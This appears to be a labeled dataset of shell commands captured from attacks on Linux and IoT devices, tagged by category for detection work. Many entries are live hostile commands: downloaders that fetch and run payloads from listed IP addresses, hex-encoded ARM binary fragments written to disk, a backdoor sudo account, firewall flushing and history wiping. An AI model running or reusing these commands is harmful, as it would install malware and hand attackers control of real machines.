+{"command": ">A@/XU'8ELFUyR", "label": "benign", "count": 2, "source": "external_2024"}
+{"command": "pkill x11vnc", "label": "defense_evasion", "count": 1, "source": "external_2024"}
+{"command": "echo \"K\"\"G\"\"B\"\"_CLOSE\";", "label": "reconnaissance", "count": 2, "source": "external_2024"}
+{"command": "/bin/bash -c \"uname -a\"", "label": "reconnaissance", "count": 2, "source": "external_2024"}
+{"command": "?", "label": "benign", "count": 1, "source": "external_2024"}
+{"command": "/tmp/ntpclient sftp.arm", "label": "malware_execution", "count": 1, "source": "external_2024"}
+{"command": "/tmp/ntpclient sftp.x86", "label": "malware_execution", "count": 1, "source": "external_2024"}
+{"command": "cat /uwu || busybox cat /uwu", "label": "reconnaissance", "count": 5, "source": "external_2024"}
+{"command": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 123456", "label": "malware_downloader", "count": 18, "source": "external_2024"}
+{"command": "if [ -f $(which uptime) ]; then", "label": "reconnaissance", "count": 2, "source": "external_2024"}
+{"command": "touch apita", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "touch dkahc", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "wget http://93.123.85.139/cayosinbins.sh; chmod 777 cayosinbins.sh; sh cayosinbins.sh; tftp 93.123.85.139 -c get cayosintftp1.sh; chmod 777 cayosintftp1.sh; sh cayosintftp1.sh; tftp -r cayosintftp2.sh -g 93.123.85.139; chmod 777 cayosintftp2.sh; sh cayosintftp2.sh; rm -rf cayosinbins.sh cayosintftp1.sh cayosintftp2.sh; rm -rf *", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://141.98.10.76/booters.sh; wget http://141.98.10.76/booters.sh; curl -O http://141.98.10.76/booters.sh; chmod 777 booters.sh; sh booters.sh", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c ; uname -a", "label": "reconnaissance", "count": 2, "source": "external_2024"}
+{"command": "./zsvc", "label": "malware_execution", "count": 3, "source": "external_2024"}
+{"command": "grep [Mm]iner", "label": "reconnaissance", "count": 3, "source": "external_2024"}
+{"command": "cmd='N/A';", "label": "benign", "count": 2, "source": "external_2024"}
+{"command": "/bin/busybox mkdir /sys/; >/sys/.file && cd /sys/", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "cd /tmp; wget http://91.92.249.158/ohshit.sh; busybox wget http://91.92.249.158/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; rm -f ohshit.sh", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "cd /tmp; curl http://23.95.132.42/bins/bins.sh -O; busybox curl http://23.95.132.42/bins/bins.sh -O; wget http://23.95.132.42/bins/bins.sh -O bins.sh; busybox wget http://23.95.132.42/bins/bins.sh -O bins.sh; chmod 777 bins.sh; busybox chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "wget 62.197.136.157/apep.x86; chmod 777 apep.x86; ./apep.x86 x86_64", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "cat /proc/self", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "startResult=$(echo \"[\"\"[\"\"[\");", "label": "reconnaissance", "count": 2, "source": "external_2024"}
+{"command": "uname -m&&pkill upnpsetup", "label": "defense_evasion", "count": 3, "source": "external_2024"}
+{"command": "touch mwyjm", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "echo 1 && cat /bin/echo", "label": "reconnaissance", "count": 66, "source": "external_2024"}
+{"command": "nvidia-smi --list-gpus | grep 0 | cut -f2 -d:", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "Connection: keep-alive", "label": "benign", "count": 1, "source": "external_2024"}
+{"command": "dd bs=1 count=1911588 > /tmp/cBOVQTCVl8", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "history -c", "label": "defense_evasion", "count": 1, "source": "external_2024"}
+{"command": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 kqymhM7C) system && sudo usermod -aG sudo system", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "touch uhynz", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "cd /tmp; wget http://185.10.68.196/update.sh; busybox wget http://139.59.88.74/update.sh; chmod 777 update.sh; sh update.sh; rm -f update.sh", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "score+5", "label": "benign", "count": 30, "source": "real_round1"}
+{"command": "exit", "label": "benign", "count": 178, "source": "real_round1"}
+{"command": "(score+5)", "label": "benign", "count": 30, "source": "real_round1"}
+{"command": "iptables -F", "label": "defense_evasion", "count": 381, "source": "real_round1"}
+{"command": ">/bin/.andromedatest && cd /bin/", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "echo -ne \"\\x7b\\xe1\\x34\\xef\\x8b\\xaf\\x40\\xf8\\x35\\x68\\x1b\\x84\\xd0\\xd8\\x07\\x45\\xe5\\xdc\\x12\\x57\\xb6\\x53\\xd9\\xe2\\xe6\\xbd\\x4f\\x41\\xe5\\x72\\x7d\\x08\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -ne \"\\x5a\\x34\\x00\\xeb\\x81\\x4f\\xa0\\xe1\\xa0\\x40\\x84\\xe1\\x80\\x3f\\xa0\\xe1\\x03\\x00\\x20\\xe0\\x04\\x10\\x21\\xe0\\xf5\\x2f\\x4f\\xe2\\x0c\\x00\\x92\\xe8\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\xca\\x32\\x00\\xeb\\x81\\x4f\\xa0\\xe1\\xa0\\x40\\x84\\xe1\\x80\\x3f\\xa0\\xe1\\x03\\x00\\x20\\xe0\\x04\\x10\\x21\\xe0\\x4d\\x2f\\x4f\\xe2\\x0c\\x00\\x92\\xe8\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "cd /proc/; cat self/cmdline", "label": "reconnaissance", "count": 174034, "source": "real_round1"}
+{"command": "echo -ne \"\\xb4\\xdc\\xed\\xf5\\x01\\x4f\\x3c\\xe2\\xb1\\x92\\x42\\xce\\xd9\\x85\\xe1\\x8f\\xdf\\x09\\xe2\\x03\\x62\\xef\\x5c\\xb7\\xa8\\xe2\\x94\\xba\\x39\\x82\\x8b\\x79\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -ne \"\\x10\\x70\\x02\\x00\\x00\\x00\\x00\\x00\\x04\\xe0\\x2d\\xe5\\x04\\xf0\\x9d\\xe4\\x00\\xb0\\xa0\\xe3\\x00\\xe0\\xa0\\xe3\\x04\\x10\\x9d\\xe4\\x0d\\x20\\xa0\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\xd3\\x00\\x00\\x9a\\x0e\\x30\\xd1\\xe5\\x0e\\x30\\xcd\\xe5\\x0f\\x00\\x54\\xe3\\x0f\\x10\\xd1\\x85\\xd5\\x00\\x00\\x9a\\x0f\\x10\\xcd\\xe5\\x0d\\x00\\xdd\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": ">/boot/.andromedatest && cd /boot/", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "echo -ne \"\\x09\\x10\\x87\\xe0\\x07\\x3e\\x00\\xeb\\x00\\x30\\xa0\\xe1\\x08\\x00\\x95\\xe5\\x00\\x30\\x85\\xe5\\x00\\x00\\x83\\xe0\\x06\\x10\\xa0\\xe1\\x07\\x20\\xa0\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x70\\x31\\x9f\\xe5\\x04\\x40\\x8d\\xe2\\x00\\x10\\x93\\xe5\\x04\\x00\\xa0\\xe1\\x10\\x20\\xa0\\xe3\\x50\\xfe\\xff\\xeb\\x04\\x20\\xdb\\xe5\\x05\\x30\\xdb\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "/bin/busybox echo > /boot/.b && sh /boot/.b && cd /boot/", "label": "reconnaissance", "count": 241, "source": "real_round1"}
+{"command": "echo -ne \"\\x01\\x70\\xd8\\xe5\\x01\\x80\\xd0\\xe5\\x1c\\x00\\x9d\\xe5\\x00\\x14\\x81\\xe1\\x14\\x10\\x8d\\xe5\\x10\\x10\\x9d\\xe5\\x0c\\xc4\\x81\\xe1\\x0c\\xc0\\x8d\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x08\\x30\\x8c\\xe5\\x0c\\x40\\x8c\\xe5\\x18\\x90\\x8c\\xe5\\x1c\\xa0\\x8c\\xe5\\x80\\x01\\x8c\\xe8\\x10\\x50\\x8c\\xe5\\x14\\x60\\x8c\\xe5\\xeb\\x07\\x00\\xeb\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "/bin/busybox echo > /var/tmp/.fxcat && sh /var/tmp/.fxcat && cd /var/tmp/", "label": "reconnaissance", "count": 381, "source": "real_round1"}
+{"command": "echo -ne \"\\xff\\x2c\\x0c\\xe2\\x0c\\x3c\\xa0\\xe1\\x21\\x14\\xa0\\xe1\\x02\\x34\\x83\\xe1\\x2c\\x1c\\x81\\xe1\\x03\\x10\\x81\\xe1\\xff\\x0c\\x01\\xe2\\x00\\xc0\\x94\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x63\\xd9\\xa0\\xd2\\x0f\\x95\\x35\\x22\\x57\\xfe\\xbf\\x2f\\x76\\xbc\\xb0\\x5c\\xe7\\x6a\\x7c\\xad\\x66\\x13\\x66\\x7c\\xbf\\xed\\x6c\\x8f\\xd5\\xbc\\x95\\xa9\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "system", "label": "reconnaissance", "count": 28120, "source": "real_round1"}
+{"command": "echo -ne \"\\x20\\xb2\\x9f\\xe5\\x00\\x10\\xa0\\xe3\\x08\\x20\\xa0\\xe3\\x34\\x10\\x8d\\xe5\\x30\\x20\\x8d\\xe5\\x00\\x00\\x00\\xea\\x30\\x30\\x8d\\xe5\\x18\\x30\\x8b\\xe2\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x34\\xef\\xff\\xeb\\x05\\x10\\xa0\\xe3\\x10\\x00\\x8d\\xe5\\x01\\x20\\xa0\\xe3\\x05\\x00\\xa0\\xe1\\x2f\\xef\\xff\\xeb\\xff\\x00\\x00\\xe2\\x14\\x00\\x8d\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "/bin/busybox MIRAI", "label": "reconnaissance", "count": 3, "source": "real_round1"}
+{"command": "echo -ne \"\\x02\\x10\\x81\\xe2\\xf7\\xff\\xff\\xca\\x28\\x30\\x81\\xe2\\x01\\x00\\x50\\xe3\\x00\\x30\\xd3\\x05\\x03\\xc0\\x8c\\x00\\x0e\\x38\\xa0\\xe1\\x23\\x38\\xa0\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://0x2763da4e/dred -o /tmp/dred;perl /tmp/dred", "label": "malware_downloader", "count": 83, "source": "real_round1"}
+{"command": "which ls", "label": "reconnaissance", "count": 6, "source": "real_round1"}
+{"command": "echo -ne \"\\xf2\\xff\\xff\\xaa\\x00\\x00\\x98\\xe5\\x00\\x00\\x50\\xe3\\xb1\\x18\\x00\\x1b\\x00\\x20\\xa0\\xe3\\x00\\x00\\xe0\\xe3\\x00\\x20\\x88\\xe5\\x04\\x20\\x88\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "/bin/busybox", "label": "reconnaissance", "count": 2416, "source": "real_round1"}
+{"command": "echo -ne \"\\x01\\x10\\xa0\\xe3\\x08\\x00\\x8d\\xe5\\x00\\x20\\xa0\\xe3\\x08\\x00\\xa0\\xe1\\x89\\xf4\\xff\\xeb\\x09\\x10\\xa0\\xe3\\x0c\\x00\\x8d\\xe5\\x00\\x20\\xa0\\xe3\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x01\\x00\\x5e\\xe3\\x00\\x10\\xa0\\xe3\\x00\\x00\\x84\\xe5\\x08\\xe0\\x84\\xe5\\x06\\x10\\xcd\\xe5\\x07\\x10\\xcd\\xe5\\x01\\x50\\xa0\\x91\\xbe\\xff\\xff\\x8a\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\xb5\\x12\\x27\\x2c\\x88\\x8a\\x92\\x6a\\xd3\\x40\\xcd\\xbe\\xf7\\x0f\\xb9\\x82\\x6c\\x43\\xa7\\x0f\\x9e\\xa9\\xdd\\xa5\\x13\\xd8\\xb6\\x7f\\x2a\\x71\\x70\\xf3\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -e \"\\x6F\\x6B\"", "label": "reconnaissance", "count": 27364, "source": "real_round1"}
+{"command": "/bin/busybox STC", "label": "reconnaissance", "count": 506, "source": "real_round1"}
+{"command": "echo -ne \"\\xc4\\x5f\\xa0\\xe1\\x00\\x40\\x94\\xe0\\x18\\x60\\x8d\\xe2\\xc0\\x00\\x96\\xe8\\x01\\x50\\xa5\\xe0\\x06\\x40\\x54\\xe0\\x07\\x50\\xc5\\xe0\\x05\\x70\\x94\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": ">/dev/netslink/.andromedatest && cd /dev/netslink/", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "echo -ne \"\\x01\\x02\\x51\\xe3\\x00\\x00\\x51\\x31\\x01\\x12\\xa0\\x31\\x04\\x20\\x82\\x32\\xfa\\xff\\xff\\x3a\\x02\\x01\\x51\\xe3\\x00\\x00\\x51\\x31\\x81\\x10\\xa0\\x31\" >> update.armv5l", "label": "malware_downloader", "count": 3, "source": "real_round1"}
+{"command": "ncorrect", "label": "benign", "count": 10, "source": "real_round1"}
+{"command": "/bin/busybox CPRIK", "label": "reconnaissance", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x14\\x30\\xd1\\xe5\\x15\\x20\\xd1\\xe5\\x02\\x00\\x40\\xe2\\x02\\x34\\x83\\xe1\\x01\\x00\\x50\\xe3\\x03\\x60\\x86\\xe0\\x02\\x10\\x81\\xe2\\xf7\\xff\\xff\\xca\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x01\\x10\\x81\\xe2\\x3f\\x20\\x82\\xe2\\x00\\xc0\\xa0\\xe3\\x01\\x10\\x85\\xe0\\x08\\x20\\x8d\\xe5\\x1c\\xc0\\x8d\\xe5\\x04\\x10\\x8d\\xe5\\x03\\x10\\xa0\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "tftp; wget; /bin/busybox WKBZT", "label": "reconnaissance", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x03\\x10\\xa0\\xe3\\xd0\\x00\\x0b\\xe5\\x04\\x20\\xa0\\xe1\\x05\\x00\\xa0\\xe1\\x81\\xf7\\xff\\xeb\\x04\\x10\\xa0\\xe3\\xcc\\x00\\x0b\\xe5\\x04\\x20\\xa0\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "/bin/busybox echo > /dev/shm/.b && sh /dev/shm/.b && cd /dev/shm/", "label": "reconnaissance", "count": 241, "source": "real_round1"}
+{"command": "echo -ne \"\\x01\\x30\\x83\\xe2\\x03\\x00\\x52\\xe1\\x10\\x30\\x8d\\xe5\\x19\\x00\\x00\\xda\\x20\\x20\\x9d\\xe5\\x00\\x00\\x52\\xe3\\x13\\x00\\x00\\x0a\\x02\\x00\\xa0\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": ">/usr/.andromedatest && cd /usr/", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "/bin/busybox ps; /bin/busybox ECCHI", "label": "reconnaissance", "count": 13, "source": "real_round1"}
+{"command": "echo -ne \"\\x1c\\x20\\x9d\\xe5\\xc3\\x32\\x8c\\xe0\\x1c\\x50\\x8d\\xe5\\x04\\x50\\xa0\\xe1\\x2c\\x20\\x8d\\xe5\\xb0\\x30\\xc1\\xe1\\x25\\x00\\x00\\xea\\x02\\x20\\x64\\xe0\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -ne \"\\x01\\x00\\x70\\xe3\\x30\\x00\\x8d\\xe5\\x01\\x00\\x80\\x02\\x05\\x01\\x00\\x0a\\x48\\x30\\x8d\\xe2\\x01\\x20\\xa0\\xe3\\x04\\x20\\x23\\xe5\\x04\\xc0\\xa0\\xe3\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x42\\x00\\x00\\x0a\\x00\\x60\\xa0\\xe3\\x05\\x80\\xa0\\xe1\\x04\\x60\\x88\\xe5\\x00\\x60\\x85\\xe5\\x04\\x00\\xa0\\xe1\\x1c\\x0d\\x00\\xeb\\x00\\xa0\\x50\\xe2\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "wget -q -t 2 -T 10 -O bot http://91.92.40.5:8080/bots/bot-x86_64 2>/dev/null && echo WGETOK", "label": "malware_downloader", "count": 3, "source": "real_round1"}
+{"command": "echo -ne \"\\x1c\\x10\\x9d\\xe5\\xff\\x28\\x01\\xe2\\x08\\xc0\\x95\\xe5\\x22\\x24\\xa0\\xe1\\x01\\x0c\\xa0\\xe1\\xff\\x3c\\x01\\xe2\\x00\\x60\\x95\\xe5\\x03\\x04\\x80\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x50\\x3d\\x19\\xfc\\x74\\x34\\x80\\x7d\\x68\\xc0\\xf0\\x1e\\x9f\\x4e\\xcf\\x1b\\x4b\\x98\\x29\\xf0\\x72\\x28\\xa3\\x61\\x74\\x47\\x93\\x08\\x55\\x5a\\x41\\x5f\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -ne \"\\x3d\\x5c\\xc6\\xef\\x62\\x08\\x61\\xf9\\xf9\\xd9\\xc3\\xc2\\xd9\\xc3\\xdd\\x6f\\xb4\\x4b\\x98\\x3d\\xad\\xc2\\x67\\x15\\x4f\\x4c\\x56\\x22\\xcb\\x88\\x22\\x32\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -ne \"\\x03\\x00\\x12\\xe3\\x00\\x00\\x30\\x13\\x0a\\x00\\x00\\x0a\\x02\\x00\\x72\\xe3\\x06\\x00\\x00\\xba\\x02\\x00\\x00\\x0a\\x01\\x00\\x50\\xe1\\x01\\x00\\x40\\x20\" >> update.armv5l", "label": "malware_downloader", "count": 3, "source": "real_round1"}
+{"command": "echo -ne \"\\xf0\\x16\\x00\\xeb\\x14\\x20\\x9d\\xe5\\x40\\x34\\xa0\\xe1\\x00\\x00\\x52\\xe3\\x04\\x00\\xc6\\xe5\\x05\\x30\\xc6\\xe5\\x02\\x00\\xa0\\x11\\x80\\x00\\x00\\x0a\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x58\\x30\\x8d\\xe5\\xf8\\x30\\x9d\\xe5\\x23\\x38\\xa0\\xe1\\x54\\x30\\x8d\\xe5\\xf0\\x30\\x9d\\xe5\\x23\\x34\\xa0\\xe1\\x4c\\x30\\x8d\\xe5\\xf0\\x30\\x9d\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x07\\x00\\x50\\xe1\\x49\\x00\\x00\\x1a\\x00\\x30\\xa0\\xe3\\x00\\x30\\x8d\\xe5\\x32\\x30\\xcd\\xe5\\x33\\x30\\xcd\\xe5\\x03\\x70\\xa0\\xe1\\x03\\x50\\xa0\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x04\\x00\\xc4\\xe5\\x24\\x10\\x9d\\xe5\\x08\\x00\\x84\\xe2\\x7f\\x1f\\x00\\xeb\\x0a\\x60\\xc5\\xe5\\x0b\\x60\\xc5\\xe5\\x05\\x00\\xa0\\xe1\\x14\\x10\\xa0\\xe3\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x08\\x90\\x95\\xe5\\x04\\x90\\x89\\xe0\\x08\\x90\\x85\\xe5\\x9f\\xfe\\xff\\xea\\x09\\x10\\x84\\xe0\\x00\\x00\\x95\\xe5\\x22\\x3e\\x00\\xeb\\x00\\x30\\xa0\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "wget http://185.93.89.72/wget -O-", "label": "malware_downloader", "count": 44, "source": "real_round1"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox IZORG", "label": "reconnaissance", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x02\\x34\\x83\\xe1\\x00\\xc0\\xa0\\xe3\\x03\\x38\\xa0\\xe1\\x18\\xc0\\x8d\\xe5\\x04\\x30\\x8d\\xe5\\x1c\\xc0\\x8d\\xe5\\x20\\xc0\\x8d\\xe5\\x19\\x00\\x00\\xea\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x97\\xc0\\xe9\\xc8\\x1e\\xb1\\x92\\x42\\x60\\xcf\\xaa\\x82\\x84\\x91\\x92\\x61\\x4a\\x94\\x30\\x0d\\x74\\x6d\\x29\\xed\\x5d\\x50\\xf9\\x63\\x06\\x5b\\x66\\x7f\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -ne \"\\xfc\\x70\\x9d\\xe5\\x01\\x50\\xd7\\xe5\\x00\\x60\\xa0\\xe3\\x02\\x10\\xd7\\xe5\\x00\\x20\\xa0\\xe3\\x03\\x30\\xd7\\xe5\\x00\\x40\\xa0\\xe3\\x10\\x90\\x8d\\xe2\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "/bin/busybox cat /proc/self/exe || cat /proc/self/exe", "label": "reconnaissance", "count": 323, "source": "real_round1"}
+{"command": ">/etc/.andromedatest && cd /etc/", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "cd /tmp; wget http://94.154.43.91/payload.sh -O- | sh", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -ne \"\\x08\\xe0\\x85\\x15\\x0c\\x20\\xa0\\x01\\xff\\x20\\x02\\x12\\x00\\x30\\x94\\xe5\\x00\\x10\\xa0\\xe3\\x08\\x10\\x84\\xe5\\x04\\x20\\xc4\\xe5\\x0c\\x30\\x84\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "busybox dd if=$SHELL bs=22 count=1||dd if=/proc/self/exe bs=22 count=1||while read i;do busybox echo -n $i;done</proc/self/exe||cat /proc/self/exe", "label": "reconnaissance", "count": 28, "source": "real_round1"}
+{"command": ">/var/.codi && cd /var/", "label": "reconnaissance", "count": 56, "source": "real_round1"}
+{"command": "echo -ne \"\\x02\\x1c\\xa0\\xe1\\xff\\x0c\\x02\\xe2\\x00\\x14\\x81\\xe1\\x22\\x3c\\x83\\xe1\\x01\\x30\\x83\\xe1\\x38\\x10\\x9d\\xe5\\x00\\x00\\x51\\xe3\\x08\\x30\\x87\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": ">/dev/.andromedatest && cd /dev/", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "/bin/busybox tftp -g bins.oceanic-node.su -r tftp.sh -l- | sh", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": ">/var/tmp/.andromedatest && cd /var/tmp/", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "echo -ne \"\\x02\\x20\\x80\\xe1\\x03\\x50\\x81\\xe1\\xaa\\x4d\\xa0\\xe1\\x09\\x50\\x95\\xe0\\x04\\x60\\x82\\xe1\\x0a\\x60\\xa6\\xe0\\xa5\\x35\\xa0\\xe1\\x86\\x3a\\x83\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": ">/tmp/.andromedatest && cd /tmp/", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "echo -ne \"\\x87\\xca\\xeb\\x85\\xb1\\x79\\x37\\x9e\\x53\\xec\\x85\\x1a\\xfe\\xb9\\xce\\xc4\\x70\\x30\\x9d\\xe5\\x01\\x00\\xd3\\xe5\\x00\\x10\\xa0\\xe3\\x00\\x50\\xd3\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\xb1\\xfb\\xbd\\xa7\\x4b\\x4d\\x25\\x24\\x3d\\x07\\x74\\xaf\\x7a\\xc2\\x7e\\xde\\xff\\xbe\\x84\\xa6\\x4b\\xa3\\x20\\x2d\\x79\\xd5\\xc8\\x4e\\x6c\\x1d\\xb3\\x07\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -ne \"\\x02\\x30\\xd2\\xe5\\x00\\x00\\x53\\xe3\\x01\\x20\\x82\\xe2\\x02\\x00\\x00\\x0a\\x01\\x40\\x84\\xe2\\x04\\x00\\x51\\xe1\\xf8\\xff\\xff\\x1a\\x01\\x00\\x84\\xe2\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": ">/var/run/.andromedatest && cd /var/run/", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "ftpget 77.90.185.66 f ftpget", "label": "malware_downloader", "count": 20, "source": "real_round1"}
+{"command": "echo -ne \"\\x04\\x20\\x93\\xe5\\x01\\x10\\xd2\\xe5\\x00\\x00\\xd2\\xe5\\x7f\\xff\\xff\\xeb\\x03\\x00\\xcd\\xe5\\x00\\x30\\x94\\xe5\\x08\\x20\\x93\\xe5\\x01\\x10\\xd2\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "/bin/busybox ftpget 205.237.110.232 ftpget.sh ftpget.sh && sh ftpget.sh/bin/busybox ANDROMEDA", "label": "malware_downloader", "count": 12007, "source": "real_round1"}
+{"command": "echo -ne \"\\xff\\x10\\x03\\x92\\x23\\x00\\x00\\x8a\\xff\\xe0\\x07\\xe2\\x30\\xc0\\x4e\\xe2\\xff\\x30\\x0c\\xe2\\x09\\x00\\x53\\xe3\\x0c\\x3c\\xa0\\x91\\x23\\x2c\\xa0\\x91\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x05\\x10\\x81\\xe1\\x06\\x20\\x82\\xe1\\x08\\x8c\\xa0\\xe1\\x04\\x48\\xa0\\xe1\\x27\\x84\\x88\\xe1\\x23\\x48\\x84\\xe1\\x9c\\x10\\x8d\\xe5\\xa0\\x20\\x8d\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x08\\x00\\x50\\xe1\\x04\\x00\\x00\\x8a\\x09\\x00\\x5e\\xe1\\x07\\x02\\x00\\x0a\\x01\\x30\\xde\\xe4\\x00\\x04\\xa0\\xe1\\x06\\x64\\x83\\xe1\\x0c\\x10\\x9d\\xe5\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": ">/.andromedatest && cd /", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "echo -ne \"\\xcc\\x18\\x9f\\xe5\\x04\\x20\\xa0\\xe1\\x78\\x32\\x00\\xeb\\x00\\x10\\xa0\\xe3\\x0f\\x10\\xc5\\xe5\\x00\\x30\\x96\\xe5\\x01\\x20\\xa0\\xe3\\x46\\x20\\xc3\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\xb5\\x30\\x8c\\xe1\\x06\\x60\\x64\\xe0\\x04\\x00\\x00\\x8a\\x09\\x00\\x5e\\xe1\\x86\\x01\\x00\\x0a\\x01\\x30\\xde\\xe4\\x02\\x24\\xa0\\xe1\\x06\\x64\\x83\\xe1\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -ne \"\\x18\\x20\\x9d\\xe5\\x02\\x00\\x5a\\xe1\\xf8\\xff\\xff\\x9a\\x18\\x60\\x89\\xe2\\xc0\\x00\\x96\\xe8\\x18\\x30\\x8d\\xe2\\x18\\x00\\x93\\xe8\\x08\\x10\\x89\\xe2\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
